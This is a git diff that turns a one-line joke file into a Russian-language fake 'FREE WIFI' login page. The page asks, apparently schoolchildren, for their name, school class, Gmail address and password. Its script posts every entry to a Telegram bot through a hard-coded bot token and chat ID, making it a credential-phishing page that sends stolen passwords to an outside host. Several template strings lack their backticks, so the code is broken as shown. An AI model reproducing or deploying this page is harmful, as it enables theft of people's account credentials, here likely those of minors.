@@ -1,1 +1,96 @@
-я лох
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free WiFi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>FREE WIFI</h1>
+        <p>что бы подключится нужно пройти авторизацию</p>
+        <input type="text" id="name" placeholder="напишите сюда имя">
+        <input type="text" id="class" placeholder="напишите свой класс">
+        <input type="text" id="email" placeholder="напишите логин @gmail">
+        <input type="password" id="password" placeholder="напишите пароль">
+        <button onclick="sendMessage()">Подключиться</button>
+    </div>
+
+    <script>
+        function sendMessage() {
+            const name = document.getElementById('name').value;
+            const userClass = document.getElementById('class').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = Имя: ${name}\nКласс: ${userClass}\nEmail: ${email}\nПароль: ${password};
+
+            const botToken = '7271868839:AAGtHfD8E1O8B6xikO9s0sooUqbjzya-kvU';
+            const chatId = '7406507427';
+            const url = https://api.telegram.org/bot${botToken}/sendMessage;
+
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send(JSON.stringify({
+                chat_id: chatId,
+                text: message
+            }));
+
+            // Дополнительно можно сбросить поля после отправки
+            document.getElementById('name').value = '';
+            document.getElementById('class').value = '';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        }
+    </script>
+</body>
+</html>
